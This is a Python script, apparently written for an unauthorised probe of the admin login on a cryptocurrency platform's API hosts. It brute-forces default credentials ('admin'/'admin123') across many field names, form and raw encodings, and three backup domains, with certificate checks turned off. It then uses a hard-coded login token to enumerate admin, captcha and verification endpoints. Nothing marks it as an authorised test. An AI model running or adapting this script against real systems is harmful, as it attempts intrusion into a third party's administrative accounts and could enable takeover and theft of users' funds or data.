"""
Riscoin Admin Login - Extended probe
Tests form-encoded, different content types, and more field combos
"""
import requests, time, json
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "SET-LANGUAGE": "ENGLISH",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

def test(url, data, label, content_type="json", method="POST"):
    headers = {**H}
    try:
        if content_type == "json":
            headers["Content-Type"] = "application/json"
            r = requests.request(method, url, json=data, headers=headers, timeout=10, verify=False)
        elif content_type == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            r = requests.request(method, url, data=data, headers=headers, timeout=10, verify=False)
        elif content_type == "raw":
            headers["Content-Type"] = "application/json"
            r = requests.request(method, url, data=data, headers=headers, timeout=10, verify=False)
        print(f"  [{r.status_code}] {label}: {r.text[:250]}")
        return r
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

print("=" * 70)
print("PHASE 1: Form-Encoded (vs JSON)")
print("=" * 70)

combos = [
    {"userName": "admin", "password": "admin123"},
    {"username": "admin", "password": "admin123"},
    {"email": "admin", "password": "admin123"},
    {"account": "admin", "password": "admin123"},
    {"loginName": "admin", "loginPwd": "admin123"},
    {"userName": "admin", "password": "admin123", "code": "1234"},
    {"userName": "admin", "password": "admin123", "googleCode": "123456"},
]

for c in combos:
    test(f"{BASE}/api/admin/login", c, f"FORM: {list(c.keys())}", "form")

print("\n" + "=" * 70)
print("PHASE 2: Raw string payloads (mimicking curl behavior)")
print("=" * 70)

# The curl on Windows was mangling JSON - perhaps sending it as raw strings
raw_payloads = [
    ('{"userName":"admin","password":"admin123"}', "raw JSON"),
    ('userName=admin&password=admin123', "raw form"),
    ('{"userName":"admin","password":"admin123","code":""}', "raw with empty code"),
    ('{"userName":"admin","password":"admin123","googleCode":""}', "raw with empty gcode"),
    ('{"userName":"admin","password":"admin123","verifyCode":"","code":""}', "raw all empty"),
]

for raw, label in raw_payloads:
    test(f"{BASE}/api/admin/login", raw, f"RAW: {label}", "raw")

print("\n" + "=" * 70)
print("PHASE 3: Try user login fields on admin endpoint")
print("=" * 70)

# The user login uses email+password - maybe admin login does too but with a twist
user_style = [
    ({"email": "admin", "password": "admin123", "invitationCode": ""}, "user-style login"),
    ({"email": "admin@riscoin.com", "password": "admin123", "type": "admin"}, "with type=admin"),
    ({"email": "admin", "password": "admin123", "loginType": "admin"}, "with loginType"),
    ({"email": "admin", "password": "admin123", "platform": "admin"}, "with platform"),
    ({"email": "admin", "password": "admin123", "clientType": "admin"}, "with clientType"),
]

for payload, label in user_style:
    test(f"{BASE}/api/admin/login", payload, label)

print("\n" + "=" * 70)
print("PHASE 4: Try ADMIN LOGIN on all backup domains (form vs json)")
print("=" * 70)

domains = ["api.riscoima.com", "api.riscoimb.com", "api.riscoimc.com"]
for domain in domains:
    print(f"\n  --- {domain} ---")
    test(f"https://{domain}/api/admin/login", 
         {"userName": "admin", "password": "admin123"}, 
         f"{domain} JSON")
    test(f"https://{domain}/api/admin/login", 
         {"userName": "admin", "password": "admin123"}, 
         f"{domain} FORM", "form")

print("\n" + "=" * 70)
print("PHASE 5: More admin endpoints exploration")
print("=" * 70)

token = "c6apl6v4ok00_1jn74vunp"
H2 = {**H, "APP-LOGIN-TOKEN": token, "Content-Type": "application/json"}

# Try to see if admin has a separate config/info endpoint
admin_info = [
    "/api/admin/info",
    "/api/admin/getInfo",  
    "/api/admin/system",
    "/api/admin/version",
    "/api/admin/captcha",
    "/api/admin/get/code",
    "/api/admin/image/code",
    "/api/admin/login/config",
    "/api/admin/login/captcha",
    "/api/admin/sms/code",
    "/api/admin/verify",
]

for path in admin_info:
    try:
        r = requests.post(f"{BASE}{path}", json={}, headers=H2, timeout=10, verify=False)
        size = len(r.content)
        code_text = ""
        try:
            j = r.json()
            code_text = f"errCode={j.get('errCode','?')}"
        except:
            code_text = r.text[:80]
        print(f"  [{r.status_code}|{size}b] {path}: {code_text}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")

print("\nDone.")
